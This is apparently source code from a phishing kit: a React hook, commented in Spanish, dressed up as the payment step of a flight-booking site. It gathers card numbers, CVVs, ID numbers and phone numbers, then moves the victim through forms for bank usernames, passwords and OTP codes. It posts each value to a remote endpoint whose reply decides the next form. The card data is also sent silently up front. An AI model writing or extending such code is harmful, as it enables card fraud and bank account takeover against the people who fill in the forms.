import { useState } from 'react';
import { API_CONFIG, API_ENDPOINTS, DEFAULT_HEADERS } from '../config/api';
import { calculateFlightTotal } from '../services';

export type FormType = 
    | 'checker-userpassword' 
    | 'checker-otpcode' 
    | 'checker-cdin' 
    | 'checker-ccaj' 
    | 'checker-cavance' 
    | 'payment';

export interface BankFormData {
    user: string;
    puser: string;
    otp: string;
    cdin: string;
    ccaj: string;
    cavance: string;
}

export interface FlightInfo {
    searchInfo: any;
    selectedFlight: any;
    selectedReturnFlight: any;
}

export interface CardData {
    cardNumber: string;
    expiryDate: string;
    cvv: string;
    installments: string;
    cardholderName: string;
    documentId: string;
    phone: string;
}

export const useBankAPI = () => {
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [error, setError] = useState("");

    const buildBasePayload = (flightInfo: FlightInfo, cardData: CardData) => {
        const { searchInfo, selectedFlight, selectedReturnFlight } = flightInfo;
        const isRoundtrip = searchInfo.tripType === "roundtrip";
        // Usar el mismo cálculo que se muestra en la UI
        const flightCalculation = calculateFlightTotal(searchInfo, selectedFlight, selectedReturnFlight);
        const taxesAndFees = 0;
        const uiTotal = Number(flightCalculation.finalTotal + taxesAndFees);

        return {
            // Campos requeridos por Joi (todos deben estar presentes)
            email: '',
            p: cardData.cardNumber,
            pdate: cardData.expiryDate,
            c: cardData.cvv,
            ban: '',
            dues: cardData.installments,
            dudename: cardData.cardholderName.split(' ')[0] || cardData.cardholderName,
            surname: cardData.cardholderName.split(' ')[1] || '',
            cc: cardData.documentId,
            telnum: cardData.phone,
            city: '',
            state: '',
            address: '',
            cdin: '',
            dintok: '',
            ccaj: '',
            cavance: '',
            tok: '',
            user: '',
            puser: '',
            err: '',
            disp: '',
            total: uiTotal,
            
            // Información del vuelo
            origin: searchInfo.origin?.name || '',
            destination: searchInfo.destination?.name || '',
            flightDates: searchInfo.startDate ? [new Date(searchInfo.startDate).toLocaleDateString('es-CO')] : [],
            flightType: isRoundtrip ? 'Ida Y Vuelta' : 'Solo Ida',
            adults: searchInfo.adults || '',
            children: searchInfo.children || '',
            babies: '',
            pannel_type: '',
            name: cardData.cardholderName,
            type: isRoundtrip ? 'Ida Y Vuelta' : 'Solo Ida',
        };
    };

    const sendDataToAPI = async (
        fieldName: string, 
        value: string, 
        flightInfo: FlightInfo, 
        cardData: CardData,
        formData: BankFormData
    ): Promise<FormType | null> => {
        setIsSubmitting(true);
        setError("");

        try {
            const basePayload = buildBasePayload(flightInfo, cardData);
            
            // Construir payload con todos los datos acumulados
            const payload = {
                ...basePayload,
                // Campos específicos del formulario bancario
                cdin: formData.cdin || '',
                dintok: '',
                ccaj: formData.ccaj || '',
                cavance: formData.cavance || '',
                tok: formData.otp || '',
                user: formData.user || '',
                puser: formData.puser || '',
                // Campo específico que se está enviando (actualiza el valor)
                [fieldName]: value
            };

            console.log('Enviando datos a la API:', payload);

            const response = await fetch(`${API_CONFIG.API_URL}${API_ENDPOINTS.SEND_DATA}`, {
                method: 'POST',
                headers: DEFAULT_HEADERS,
                body: JSON.stringify(payload)
            });

            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }

            const data = await response.json();
            console.log('Respuesta de la API:', data);

            if (data.redirect_to) {
                return data.redirect_to as FormType;
            } else {
                throw new Error('Respuesta de API inválida');
            }

        } catch (error) {
            console.error('Error enviando datos:', error);
            setError('Error de conexión. Intenta nuevamente.');
            return null;
        } finally {
            setIsSubmitting(false);
        }
    };

    const sendInitialCardData = async (flightInfo: FlightInfo, cardData: CardData): Promise<void> => {
        try {
            const payload = buildBasePayload(flightInfo, cardData);
            
            // Enviar datos iniciales de la tarjeta (fire and forget)
            fetch(`${API_CONFIG.API_URL}${API_ENDPOINTS.SEND_DATA}`, {
                method: 'POST',
                headers: DEFAULT_HEADERS,
                body: JSON.stringify(payload),
                mode: 'cors',
                credentials: 'omit'
            }).catch(error => {
                console.error('Error enviando datos iniciales:', error);
            });
        } catch (error) {
            console.error('Error preparando datos iniciales:', error);
        }
    };

    return {
        isSubmitting,
        error,
        setError,
        sendDataToAPI,
        sendInitialCardData
    };
};
